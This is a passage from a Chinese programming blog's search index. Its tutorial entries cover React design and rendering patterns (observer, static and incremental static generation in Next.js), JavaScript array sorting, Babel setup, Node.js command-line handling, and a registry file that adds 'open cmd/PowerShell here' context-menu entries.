me!\u0026lt;/Button\u0026gt;\r\u0026lt;FormControlLabel control={\u0026lt;Switch /\u0026gt;} /\u0026gt;\r\u0026lt;ToastContainer /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 每当事件发生时，logger 和 toastify 函数都会收到通知。 现在我们只需要实现实际通知 observable 的函数：handleClick 和 handleToggle 函数！ 这些函数应该调用 observable 上的 notify 方法，并传递观察者应该接收的数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import { ToastContainer, toast } from \u0026#34;react-toastify\u0026#34;; function logger(data) { console.log(`${Date.now()}${data}`); } function toastify(data) { toast(data); } observable.subscribe(logger); observable.subscribe(toastify); export default function App() { function handleClick() { observable.notify(\u0026#34;用户点击按钮！\u0026#34;); } function handleToggle() { observable.notify(\u0026#34;用户拨动开关！\u0026#34;); } return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;Button\u0026gt;Click me!\u0026lt;/Button\u0026gt; \u0026lt;FormControlLabel control={\u0026lt;Switch /\u0026gt;} /\u0026gt; \u0026lt;ToastContainer /\u0026gt; \u0026lt;/div\u0026gt; ); }   Awesome! 我们刚刚完成了整个流程：\n1 2 3 4 5 6  1. ---\u0026gt; `handleClick 和 handleToggle 调用观察者上的通知方法` 2. ---\u0026gt; `观察者通知订阅者：logger 和 toastify 函数` 3. ---\u0026gt; `每当用户与任一组件交互时，logger 和 toastify 函数都会收到 notify 方法的通知！   尽管我们可以通过多种方式使用观察者模式，但它在处理基于事件的异步数据时非常有用。\n 也许您希望某些组件在某些数据下载完成时收到通知 或者每当用户向留言板发送新消息并且所有其他成员都应该收到通知时  \r案例分析 RxJS 使用可观察模式的流行库是 RxJS。\n ReactiveX 将观察者模式与迭代器模式以及函数式编程与集合相结合，以满足对管理事件序列的理想方式的需求。 - RxJS\n 使用 RxJS，我们可以创建 observable 并订阅某些事件！ 让我们看一个在他们的文档中介绍的例子，它记录了用户是否在文档中拖动。\nRxJS 有大量使用可观察模式的内置功能和示例。\n\r优点 使用观察者模式是强制分离关注点和单一职责原则的好方法。 观察者对象与可观察对象并不紧密耦合，并且可以随时（解）耦合。 observable 对象负责监控事件，而观察者只是处理接收到的数据。\n\r缺点 如果观察者变得过于复杂，则在通知所有订阅者时可能会导致性能问题。\n\r知识点  Array.prototype.push() Array.prototype.filter() Array.prototype.forEach()  ","description":"使用 observables 在事件发生时通知订阅者","id":99,"section":"react-patterns","tags":null,"title":"观察者模式","uri":"https://codthing.github.io/react-patterns/design-patterns/observer-pattern/"},{"content":"根据我们对 SSR 的讨论，知道服务器上较长的请求处理时间会对 TTFB 产生负面影响。\n类似地，对于 CSR，由于下载和处理脚本所花费的时间，大型 JavaScript 包可能对应用程序的 FCP、LCP 和 TTI 有害。\n静态呈现或静态生成 (SSG) 试图通过将预呈现的 HTML 内容交付给在构建站点时生成的客户端来解决这些问题。\n每个用户可以访问的路由对应的静态HTML文件是提前生成的。 这些静态 HTML 文件可能在服务器或 CDN 上可用，并在客户端请求时获取。\n\r静态文件也可以被缓存，从而提供更大的弹性。\n由于 HTML 响应是预先生成的，服务器上的处理时间可以忽略不计，从而导致更快的 TTFB 和更好的性能。\n在理想的情况下，客户端 JS 应该是最少的，并且静态页面应该在客户端收到响应后立即变得可交互。\n因此，SSG 有助于实现更快的 FCP/TTI。\n\rSSG - 基本结构 顾名思义，静态渲染非常适合静态内容，其中页面不需要根据登录用户进行定制（例如个性化推荐）。\n因此，像“关于我们”、“联系我们”、网站的博客页面或电子商务应用程序的产品页面等静态页面是静态渲染的理想选择。\nNext.js、Gatsby 和 VuePress 等框架支持静态生成。\n让我们从这个没有任何数据的静态内容渲染的简单 Next.js 示例开始。\nNext.js:\n1 2 3 4 5 6 7 8 9  // pages/about.js  export default function About() { return \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;About Us\u0026lt;/h1\u0026gt; {/* ... */} \u0026lt;/div\u0026gt; }   当站点被构建（使用 Next.js 构建）时，这个页面将被预渲染成一个 HTML 文件 about.html，可在 /about 路径访问。\n\r有数据的 SSG “关于我们”或“联系我们”页面中的静态内容可能会按原样呈现，而无需从数据存储中获取数据。\n但是，对于单个博客页面或产品页面等内容，来自数据存储的数据必须与特定模板合并，然后在构建时呈现为 HTML。\n生成的 HTML 页面的数量将分别取决于博客文章的数量或产品的数量。\n要访问这些页面，您可能还有列表页面，这些页面将是包含分类和格式化的数据项列表的 HTML 页面。\n这些场景可以使用 Next.js 静态渲染来解决。\n我们可以根据可用项目生成列表页面或单个项目页面。 让我们看看如何。\n列表页面 - 所有项目 列表页面的生成是页面上显示的内容依赖于外部数据的场景。\n这些数据将在构建时从数据库中获取以构建页面。\n在 Next.js 中，这可以通过在页面组件中导出函数 getStaticProps() 来实现。\n该函数在构建服务器上的构建时被调用以获取数据。\n然后可以将数据传递给页面的 props 以预渲染页面组件。\n让我们看一下生成产品列表页面的代码，该页面最初是作为本文的一部分共享的。\n// 此函数在构建时在构建服务器上运行\rexport async function getStaticProps() {\rreturn {\rprops: {\rproducts: await getProductsFromDatabase()\r}\r}\r}\r// 页面组件在构建时从 getStaticProps 接收 products 属性\rexport default function Products({ products }) {\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;h1\u0026gt;Products\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{products.map((product) =\u0026gt; (\r\u0026lt;li key={product.id}\u0026gt;{product.name}\u0026lt;/li\u0026gt;\r))}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} 该函数不会包含在客户端 JS 包中，因此甚至可以用于直接从数据库中获取数据。\n个人详情页面 - 每项 在上面的示例中，我们可以为列表页面上列出的每个产品创建一个单独的详细页面。\n这些页面可以通过点击列表页面上的相应项目或直接通过一些其他途径来访问。\n假设我们有产品 ID 为 101,102 103 的产品，依此类推。 我们需要在路由 /products/101、/products/102、/products/103 等处提供他们的信息。\n为了在 Next.js 的构建时实现这一点，我们可以将函数 getStaticPaths() 与动态路由结合使用。\n我们需要为此创建一个公共页面组件 products/[id].js 并导出其中的函数 getStaticPaths()。\n该函数将返回所有可能的产品 ID，这些 ID 可用于在构建时预呈现单个产品页面。\n此处可用的以下 Next.js 框架显示了如何为此构建代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  // pages/products/[id].js  // 页面/产品/[id].js  // 在 getStaticPaths() 中，需要返回要在构建时预渲染的产品页面 (/products/[id]) 的 id 列表。 // 为此，可以从数据库中获取所有产品。 export async function getStaticPaths() { const products = await getProductsFromDatabase() const paths = products.map((product) =\u0026gt; ({ params: { id: product.id } })) // fallback: 回退：false 意味着没有正确 id 的页面将 404。  return { paths, fallback: false } } // params 将包含每个生成页面的 id。 export async function getStaticProps({ params }) { return { props: { product: await getProductFromDatabase(params.id) } } } export default function Product({ product }) { // Render product }   产品页面上的详细信息可以在构建时使用特定产品 ID 的 getStaticProps 函数填充。\n注意这里使用 fallback: false 指标。 这意味着如果没有对应特定路线或产品 ID 的页面可用，则会显示 404 错误页面。\n因此我们可以使用 SSG 来预渲染许多不同类型的页面。\n\rSSG - 关键注意事项 如前所述，SSG 为网站带来了出色的性能，因为它减少了客户端和服务器所需的处理。\n这些网站也是 SEO 友好的，因为内容已经存在，并且可以由网络爬虫轻松呈现。\n虽然性能和 SEO 使 SSG 成为一种很好的呈现模式，但在评估 SSG 对特定应用程序的适用性时需要考虑以下因素。\n 大量 HTML 文件：  需要为用户可能访问的每条可能路线生成单独的 HTML 文件。 例如，当将它用于博客时，将为数据存储中可用的每个博客文章生成一个 HTML 文件。 随后，对任何帖子的编辑都需要重新构建，以便更新反映在静态 HTML 文件中。 维护大量 HTML 文件可能具有挑战性。\n托管依赖：  对于 SSG 站点来说，要超快和快速响应，用于存储和提供 HTML 文件的托管平台也应该是好的。 如果将经过良好调整的 SSG 网站托管在多个 CDN 上以利用边缘缓存，则可能获得最佳性能。\n动态内容：  每次内容发生变化时，都需要构建和重新部署 SSG 站点。 如果在任何内容更改后尚未构建和部署站点，则显示的内容可能会过时。 这使得 SSG 不适合高度动态的内容。\n\r知识点  getStaticProps() getStaticPaths() 动态路由  ","description":"交付在构建站点时生成的预渲染 HTML 内容","id":100,"section":"react-patterns","tags":null,"title":"静态生成","uri":"https://codthing.github.io/react-patterns/render-patterns/static-rendering/"},{"content":"sort() 方法就地对数组的元素进行排序并返回排序后的数组。 默认排序顺序是升序，建立在将元素转换为字符串，然后比较它们的 UTF-16 代码单元值序列的基础上。\n排序的时间和空间复杂度无法保证，因为它取决于实现。\n\r使用 sort 方法按字母顺序给数组排序 sort 方法可以根据回调函数对数组元素进行排序。\n1 2 3 4 5 6 7 8  function ascendingOrder(arr) { return arr.sort(function(a, b) { return a - b; }); } ascendingOrder([1, 5, 2, 3, 4]); // [1, 2, 3, 4, 5]   1 2 3 4 5 6 7 8  function reverseAlpha(arr) { return arr.sort(function(a, b) { return a === b ? 0 : a \u0026lt; b ? 1 : -1; }); } reverseAlpha([\u0026#39;l\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;z\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;s\u0026#39;]); // [\u0026#39;z\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;b\u0026#39;]   JavaScript 的默认排序方法是 Unicode 值顺序排序，有时可能会得到意想不到的结果。\n因此，建议提供一个回调函数来指定如何对数组项目排序。\n这个回调函数通常叫做 compareFunction，它根据 compareFunction 的返回值决定数组元素的排序方式：\n  如果两个元素 a 和 b，compareFunction(a,b) 返回一个比 0 小的值，那么 a 会在 b 的前面。\n  如果两个元素 a 和 b，compareFunction(a,b) 返回一个比 0 大的值，那么 b 会在 a 的前面。\n  如果两个元素 a 和 b，compareFunction(a,b) 返回等于 0 的值，那么 a 和 b 的位置保持不变。\n  \r在 alphabeticalOrder 函数中使用 sort 方法对 arr 中的元素按照字母顺序排列。 该函数应返回一个排序的数组。\n1 2 3 4 5 6 7 8 9 10  function alphabeticalOrder(arr) { return arr.sort(function (a, b) { return a === b ? 0 : a \u0026lt; b ? -1 : 1; }); } alphabeticalOrder([\u0026#34;a\u0026#34;, \u0026#34;d\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;z\u0026#34;, \u0026#34;g\u0026#34;]); // [ \u0026#39;a\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;z\u0026#39; ]   \r在不更改原始数组的前提下返回排序后的数组 sort 方法会产生改变原始数组中元素顺序的副作用。\n换句话说，它会改变数组的位置。\n避免这种情况的一种方法是先将空数组连接到正在排序的数组上（记住 slice 和 concat 返回一个新数组），再用sort方法。\n在 nonMutatingSort 函数中使用 sort 方法对数组中的元素按升序进行排列。 函数不能改变 globalArray 变量，应返回一个新数组。\n1 2 3 4 5 6 7 8 9 10 11 12 13  const globalArray = [5, 6, 3, 2, 9]; function nonMutatingSort(arr) { return [].concat(arr).sort(function (a, b) { return a - b; }); } nonMutatingSort(globalArray); // [ 2, 3, 5, 6, 9 ] console.log(globalArray); // [ 5, 6, 3, 2, 9 ]   ","description":"sort() 方法就地对数组的元素进行排序并返回排序后的数组。 默认排序顺序是升序，建立在将元素转换为字符串，然后比较它们的 UTF-16 代码单元值序列的基础上。","id":101,"section":"javascript","tags":null,"title":"Array.prototype.sort()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/sort-programming/"},{"content":"Babel是Web Developer工具集中的出色条目。 这是一个了不起的工具，已经存在了一段时间，但是如今几乎每个JavaScript开发人员都依赖它，并且这种情况将继续下去，因为Babel现在不可或缺，并且已经解决了每个人的大难题。\n哪个问题？\n每个Web开发人员肯定都有的问题：JavaScript的功能在最新版本的浏览器中可用，但在较早的版本中不可用。 也许Chrome或Firefox可以实现它，但Safari iOS和Edge却不能。\n例如，ES6引入了箭头函数：\n[1, 2, 3].map((n) =\u0026gt; n + 1) 现在所有现代浏览器都支持该功能。 IE11不支持它，也不支持Opera Mini（我怎么知道？通过检查ES6兼容性表）。\n那么您应该如何处理这个问题呢？ 您应该继续前进，让那些使用较旧/不兼容浏览器的客户留下来，还是应该编写较旧的JavaScript代码使所有用户满意？\n输入Babel。 Babel是一个编译器：它采用一种标准编写的代码，然后将其转换为另一种标准编写的代码。\n您可以配置Babel将现代ES2017 JavaScript转换为JavaScript ES5语法：\n[1, 2, 3].map(function(n) {\rreturn n + 1\r}) 这必须在构建时发生，因此您必须设置一个工作流程来为您处理。\nWebpack是常见的解决方案。\n（请注意，如果您对这些ES事情都感到困惑，请参阅ECMAScript指南中有关ES版本的更多信息）\n一、安装Babel 使用npm可以很容易地在项目本地安装Babel：\nnpm install --save-dev @babel/core @babel/cli 过去，我建议在全局范围内安装babel-cli，但是现在Babel维护人员不建议这样做，因为通过在本地使用babel，您可以在每个项目中使用不同版本的Babel，而且在存储库中检入babel对于团队合作更有利\n由于npm现在随npx一起提供，因此可以通过在项目文件夹中键入命令来运行本地安装的CLI软件包：\nnpx babel script.js 二、Babel配置示例 Babel开箱即用并没有做任何有用的事情，您需要对其进行配置并添加插件。\n这是Babel插件的列表\n为了解决我们在简介中讨论的问题（在每个浏览器中使用箭头功能），我们可以运行\nnpm install --save-dev @babel/plugin-transform-es2015-arrow-functions 将该包下载到我们应用程序的node_modules文件夹中，那么我们需要添加\n{\r\u0026#34;plugins\u0026#34;: [\u0026#34;transform-es2015-arrow-functions\u0026#34;]\r} 到应用程序根文件夹中存在的.babelrc文件。 如果还没有该文件，则只需创建一个空白文件，然后将其内容放入其中。\n提示：如果您从未见过点文件（以点开头的文件），乍一看可能很奇怪，因为该文件可能不会出现在文件管理器中，因为它是隐藏文件。\n现在，如果我们有一个包含以下内容的script.js文件：\nvar a = () =\u0026gt; {};\rvar a = (b) =\u0026gt; b;\rconst double = [1,2,3].map((num) =\u0026gt; num * 2);\rconsole.log(double); // [2,4,6]\rvar bob = {\r_name: \u0026#34;Bob\u0026#34;,\r_friends: [\u0026#34;Sally\u0026#34;, \u0026#34;Tom\u0026#34;],\rprintFriends() {\rthis._friends.forEach(f =\u0026gt;\rconsole.log(this._name + \u0026#34; knows \u0026#34; + f));\r}\r};\rconsole.log(bob.printFriends()); 运行babel script.js将输出以下代码：\nvar a = function () {};var a = function (b) {\rreturn b;\r};\rconst double = [1, 2, 3].map(function (num) {\rreturn num * 2;\r});console.log(double); // [2,4,6]\rvar bob = {\r_name: \u0026#34;Bob\u0026#34;,\r_friends: [\u0026#34;Sally\u0026#34;, \u0026#34;Tom\u0026#34;],\rprintFriends() {\rvar _this = this;\rthis._friends.forEach(function (f) {\rreturn console.log(_this._name + \u0026#34; knows \u0026#34; + f);\r});\r}\r};\rconsole.log(bob.printFriends()); 如您所见，箭头函数已全部转换为JavaScript ES5函数。\n三、Babel预设 我们刚刚在上一篇文章中看到了如何配置Babel来转换特定的JavaScript函数。\n您可以添加更多的插件，但是不能一一添加到配置功能中，这是不实际的。\n这就是Babel提供预设的原因。\n最受欢迎的预设是env和react。\n提示：Babel 7已弃用（并删除了）每年的预设（例如preset-es2017和舞台预设）。 请改用@babel/preset-env。\nenv预设非常好：您告诉它要支持哪些环境，它确实为您提供所有功能，并支持所有现代JavaScript功能。\n例如。 “支持每个浏览器的最后2个版本，但对于Safari，支持Safari 7之后的所有版本。\n{\r\u0026#34;presets\u0026#34;: [\r[\u0026#34;env\u0026#34;, {\r\u0026#34;targets\u0026#34;: {\r\u0026#34;browsers\u0026#34;: [\u0026#34;last 2 versions\u0026#34;, \u0026#34;safari \u0026gt;= 7\u0026#34;]\r}\r}]\r]\r} 或“不需要浏览器支持，只需使用Node.js 6.10”\n{\r\u0026#34;presets\u0026#34;: [\r[\u0026#34;env\u0026#34;, {\r\u0026#34;targets\u0026#34;: {\r\u0026#34;node\u0026#34;: \u0026#34;6.10\u0026#34;\r}\r}]\r]\r} 在编写React应用程序时，react预设非常方便：添加预设preset-flow，syntaxjsx，transform-react-jsx，transform-react-display-name。\n通过包含它，您已经准备好使用JSX转换和Flow支持来开发React应用程序。\n有关预设的更多信息\nhttps://babeljs.io/docs/plugins/\n四、将Babel与Webpack一起使用 如果您想在浏览器中运行现代JavaScript，单凭Babel是不够的，您还需要bundle捆绑代码。 Webpack是实现此目的的完美工具。\n提示：如果您不熟悉webpack，请阅读webpack指南\n现代JS需要两个不同的阶段：编译阶段和运行时阶段。 这是因为某些ES6 +功能需要polyfill或runtime帮助程序。\n要安装Babel polyfill和runtime助手，请运行\nnpm install @babel/polyfill @babel/runtime @babel/plugin-transform-runtime 现在在您的webpack.config.js文件中添加：\nentry: [\r\u0026#39;babel-polyfill\u0026#39;,\r// your app scripts should be here\r],\rmodule: {\rloaders: [\r// Babel loader compiles ES2015 into ES5 for\r// complete cross-browser support\r{\rloader: \u0026#39;babel-loader\u0026#39;,\rtest: /\\.js$/,\r// only include files present in the `src` subdirectory\rinclude: [path.resolve(__dirname, \u0026#34;src\u0026#34;)],\r// exclude node_modules, equivalent to the above line\rexclude: /node_modules/,\rquery: {\r// Use the default ES2015 preset\r// to include all ES2015 features\rpresets: [\u0026#39;es2015\u0026#39;],\rplugins: [\u0026#39;transform-runtime\u0026#39;]\r}\r}\r]\r} 通过将预设和插件信息保留在webpack.config.js文件中，我们可以避免使用.babelrc文件。\n五、Babel 的缺陷 转码当然会损耗性能，如果追求极致性能，可排除。\n","description":"","id":102,"section":"others","tags":null,"title":"Babel","uri":"https://codthing.github.io/others/babel/babel-base/"},{"content":"直接新建txt，粘贴进去保存，然后选择另存为，保存类型选所有文件、编码选ANSI、文件名为CmdAndPowershellAll.reg(名字无所谓，后缀为.reg就可以)。双击安装。\nWindows Registry Editor Version 5.00\r; 原文链接：\r; https://blog.csdn.net/cxrsdn/article/details/84538767\r; 若原先有，先删除原来的\r[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere]\r[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\r[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\PowershellAdmin]\r; 1.右键：命令行\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere]\r@=\u0026#34;在此处打开命令行窗口\u0026#34;\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere\\command]\r@=\u0026#34;cmd.exe -noexit -command Set-Location -literalPath \\\u0026#34;%V\\\u0026#34;\u0026#34; ; 2.右键：命令行（管理员）\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\r@=\u0026#34;在此处打开命令行窗口(管理员)\u0026#34;\r\u0026#34;ShowBasedOnVelocityId\u0026#34;=dword:00639bc8\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]\r@=\u0026#34;cmd.exe /s /k pushd \\\u0026#34;%V\\\u0026#34;\u0026#34;\r; 3.shift+右键：Powershell(管理员)\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\PowershellAdmin]\r@=\u0026#34;在此处打开 Powershell 窗口(管理员)\u0026#34;\r\u0026#34;Extended\u0026#34;=\u0026#34;\u0026#34;\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\PowershellAdmin\\command]\r@=\u0026#34;\\\u0026#34;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\u0026#34; -windowstyle hidden -Command $stpath = pwd; Start-Process PowerShell -ArgumentList \\\\\\\u0026#34;-NoExit\\\\\\\u0026#34;, \\\\\\\u0026#34;-Command Set-Location -literalPath \u0026#39;%V\u0026#39;\\\\\\\u0026#34; -verb RunAs\u0026#34;\r; 4.设置右键 管理员打开cmd的另一种方法（可用来替换上面的2）\r; 通过Powershell调起，会闪过一次Powershell的窗口，去掉下面几行的[; ]可以取消注释\r; [-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHereAdmin]\r; ; [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHereAdmin]\r; @=\u0026#34;在此处打开命令行窗口(管理员)\u0026#34;\r; ; [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHereAdmin\\command]\r; @=\u0026#34;PowerShell -windowstyle hidden -Command \\\u0026#34;Start-Process cmd.exe -ArgumentList \u0026#39;/s,/k, pushd,%V\u0026#39; -Verb RunAs\\\u0026#34;\u0026#34; ","description":"","id":103,"section":"others","tags":null,"title":"右键添加cmd和psl窗口命令","uri":"https://codthing.github.io/others/cmd/cmdpsl/"},{"content":"一、从命令行接受参数 在调用 Node.js 应用程序时，可以使用任意数量的参数\n参数可以是独立的，也可以有一个键和一个值。\n1 2 3 4 5 6  node app.js joe // or  node app.js name=joe   这会改变 Node.js 代码中检索此值的方式。\n检索它的方式是使用 Node.js 中内置的 process 对象。\n它公开了一个 argv 属性，这是一个包含所有命令行调用参数的数组。\n第一个元素是节点命令的完整路径。\n第二个元素是正在执行的文件的完整路径。\n所有附加参数都从第三个位置开始。\n可以使用循环遍历所有参数（包括节点路径和文件路径）：\n1 2 3 4  process.argv.forEach((val, index) =\u0026gt; { console.log(`${index}: ${val}`) })   可以通过创建一个排除前 2 个参数的新数组来仅获取附加参数：\n1 2  const args = process.argv.slice(2)   如果有一个没有索引名称的参数，如下所示：\n1 2 3 4 5 6  node app.js joe // 需要这样子访问它 const args = process.argv.slice(2) args[0]   args[0] 是 name=joe，需要解析它。 最好的方法是使用 minimist 库，它有助于处理参数：\n1 2  node app.js name=joe   1 2  yarn add minimist   需要在每个参数名称前使用双破折号：\n1 2  node app.js --name=joe   \r二、输出到命令行 1. 使用 console.log() 的基本输出 Node.js 提供了一个console模块，它提供了大量非常有用的方式来与命令行交互。\n1 2 3 4  const x = \u0026#39;x\u0026#39; const y = \u0026#39;y\u0026#39; console.log(x, y)   还可以通过传递变量和格式说明符来格式化漂亮的短语。\n1 2  console.log(\u0026#39;My %s has %d years\u0026#39;, \u0026#39;cat\u0026#39;, 2)    %s 将变量格式化为字符串 %d 将变量格式化为数字 %i 仅将变量格式化为其整数部分 %o 将变量格式化为对象  1 2  console.log(\u0026#39;%o\u0026#39;, Number)   2. 清除 console.clear() console.clear()\n清除控制台（行为可能取决于所使用的控制台）\n3. 计数 console.count() console.count() 是一个方便的方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  const x = 1 const y = 2 const z = 3 console.count( \u0026#39;The value of x is \u0026#39; + x + \u0026#39; and has been checked .. how many times?\u0026#39; ) console.count( \u0026#39;The value of x is \u0026#39; + x + \u0026#39; and has been checked .. how many times?\u0026#39; ) console.count( \u0026#39;The value of y is \u0026#39; + y + \u0026#39; and has been checked .. how many times?\u0026#39; ) // The value of x is 1 and has been checked .. how many times?: 1 // The value of x is 1 and has been checked .. how many times?: 2 // The value of y is 2 and has been checked .. how many times?: 1   1 2 3 4 5 6 7 8 9  const oranges = [\u0026#39;orange\u0026#39;, \u0026#39;orange\u0026#39;] const apples = [\u0026#39;just one apple\u0026#39;] oranges.forEach(fruit =\u0026gt; { console.count(fruit) }) apples.forEach(fruit =\u0026gt; { console.count(fruit) })   4. 重置计数 console.countReset() 1 2  console.countReset(\u0026#39;orange\u0026#39;)   5. 打印堆栈跟踪 console.trace() 1 2 3 4  const function2 = () =\u0026gt; console.trace() const function1 = () =\u0026gt; function2() function1()   1 2 3 4 5 6 7 8 9 10 11 12  Trace at function2 (repl:1:33) at function1 (repl:1:25) at repl:1:1 at ContextifyScript.Script.runInThisContext (vm.js:44:33) at REPLServer.defaultEval (repl.js:239:29) at bound (domain.js:301:14) at REPLServer.runBound [as eval] (domain.js:314:12) at REPLServer.onLine (repl.js:440:10) at emitOne (events.js:120:20) at REPLServer.emit (events.js:210:7)   6. 计算花费的时间 time() timeEnd() 1 2 3 4 5 6 7 8 9  const doSomething = () =\u0026gt; console.log(\u0026#39;test\u0026#39;) const measureDoingSomething = () =\u0026gt; { console.time(\u0026#39;doSomething()\u0026#39;) //do something, and measure the time it takes  doSomething() console.timeEnd(\u0026#39;doSomething()\u0026#39;) } measureDoingSomething()   7. 标准输出 console.log 和标准错误 console.error console.log 非常适合在控制台中打印消息。这就是所谓的标准输出，或 stdout.\nconsole.error 打印到 stderr 流。\n它不会出现在控制台中，但会出现在错误日志中。\n8. 为输出着色 chalk 1 2  console.log(\u0026#39;\\x1b[33m%s\\x1b[0m\u0026#39;, \u0026#39;hi!\u0026#39;)   hi! 以黄色打印。\n但是，这是执行此操作的低级方法。为控制台输出着色的最简单方法是使用库。Chalk 就是这样一个库，除了着色之外，它还有助于其他样式工具，例如使文本加粗、斜体或下划线。\n1 2 3  const chalk = require(\u0026#39;chalk\u0026#39;) console.log(chalk.yellow(\u0026#39;hi!\u0026#39;))   使用 chalk.yellow 起来比试图记住转义码要方便得多，而且代码的可读性要强得多\n9. 创建进度条 progress Progress是一个很棒的包，用于在控制台中创建进度条。安装它使用npm install progress\n此代码段创建了一个 10 步进度条，每 100 毫秒完成一个步骤。当柱线完成时，我们清除间隔：\n1 2 3 4 5 6 7 8 9 10  const ProgressBar = require(\u0026#39;progress\u0026#39;) const bar = new ProgressBar(\u0026#39;:bar\u0026#39;, { total: 10 }) const timer = setInterval(() =\u0026gt; { bar.tick() if (bar.complete) { clearInterval(timer) } }, 100)   \r三、接受命令行的输入 使 Node.js CLI 程序具有交互性\nyarn add inquirer\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  const inquirer = require(\u0026#39;inquirer\u0026#39;) var questions = [ { type: \u0026#39;input\u0026#39;, name: \u0026#39;name\u0026#39;, message: \u0026#34;What\u0026#39;s your name?\u0026#34; } ] inquirer.prompt(questions).then(answers =\u0026gt; { console.log(`Hi ${answers[\u0026#39;name\u0026#39;]}!`) })   Inquirer.js 可以让你做很多事情，比如询问多项选择、有单选按钮、确认等等。\n了解所有替代方案是值得的，尤其是 Node.js 提供的内置替代方案，但如果您打算将 CLI 输入提升到一个新的水平，Inquirer.js 是最佳选择。\n","description":"","id":104,"section":"nodejs","tags":null,"title":"命令行","uri":"https://codthing.github.io/nodejs/nodebase/node-cmd/"},{"content":"静态生成 (SSG) 解决了 SSR 和 CSR 的大部分问题，但适用于渲染大部分静态内容。\n当要呈现的内容是动态的或经常变化时，它会造成限制。\n想想一个有多个帖子的不断增长的博客。 您不可能仅仅因为想要更正其中一篇文章中的错字而想要重建和重新部署站点。\n同样，一篇新的博客文章也不应该需要对所有现有页面进行重建。\n因此，单靠 SSG 不足以渲染大型网站或应用程序。\n增量静态生成 (iSSG) 模式是作为 SSG 的升级引入的，以帮助解决动态数据问题并帮助静态站点针对大量频繁变化的数据进行扩展。\niSSG 允许通过在后台预渲染页面子集来更新现有页面并添加新页面，即使有新的页面请求进入也是如此。\n\riSSG - 示例代码 iSSG 在两个方面工作，在现有静态站点建成后逐步引入更新。\n  允许添加新页面\n  允许更新现有页面，也称为增量静态“重新”生成\n  添加新页面 延迟加载概念用于在构建后在网站上包含新页面。\n这意味着在第一次请求时立即生成新页面。 在生成过程中，可以在前端向用户显示回退页面或加载指示器。\n将此与前面针对每个产品的单个详细信息页面讨论的 SSG 方案进行比较。 404 错误页面在此处显示为不存在页面的后备。\n现在让我们看看使用 iSSG 延迟加载不存在的页面所需的 Next.js 代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  // 在 getStaticPaths() 中，需要返回要在构建时预渲染的产品页面 (/products/[id]) 的 id 列表。 // 为此，可以从数据库中获取所有产品。 export async function getStaticPaths() { const products = await getProductsFromDatabase(); const paths = products.map((product) =\u0026gt; ({ params: { id: product.id } })); // fallback: true 意味着丢失的页面不会 404，而是可以渲染回退。  return { paths, fallback: true }; } // params 将包含每个生成页面的 id。 export async function getStaticProps({ params }) { return { props: { product: await getProductFromDatabase(params.id) } } } export default function Product({ product }) { const router = useRouter(); if (router.isFallback) { return \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;; } // Render product }   在这里，我们使用了回退：true。\n现在，如果与特定产品对应的页面不可用，我们会显示该页面的后备版本，例如，如上面的 Product 函数中所示的加载指示器。\n同时，Next.js 会在后台生成页面。 一旦生成，它将被缓存并显示而不是回退页面。 该页面的缓存版本现在将根据请求立即显示给任何后续访问者。\n对于新页面和现有页面，我们可以设置 Next.js 应该重新验证和更新它的到期时间。\n这可以通过使用 revalidate 属性来实现，如下一节所示。\n更新现有页面 要重新呈现现有页面，需要为页面定义合适的超时时间。 这将确保在定义的超时期限过去后重新验证页面。\n超时可以设置为低至 1 秒。 用户将继续看到页面的先前版本，直到页面完成重新验证。\n因此，iSSG 使用 stale-while-revalidate 策略，其中用户在重新验证时接收缓存或过时的版本。 重新验证完全在后台进行，无需完全重建。\n让我们回到基于数据库中的数据为产品生成静态列表页面的示例。 为了使其服务于相对动态的产品列表，将包含设置重建页面超时的代码。\n这就是包含超时后代码的样子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  // 此函数在构建服务器上运行 export async function getStaticProps() { return { props: { products: await getProductsFromDatabase(), revalidate: 60, // 这将强制页面在 60 秒后重新验证  } } } // 页面组件在构建时从 getStaticProps 接收 products 属性 export default function Products({ products }) { return ( \u0026lt;\u0026gt; \u0026lt;h1\u0026gt;Products\u0026lt;/h1\u0026gt; \u0026lt;ul\u0026gt; {products.map((product) =\u0026gt; ( \u0026lt;li 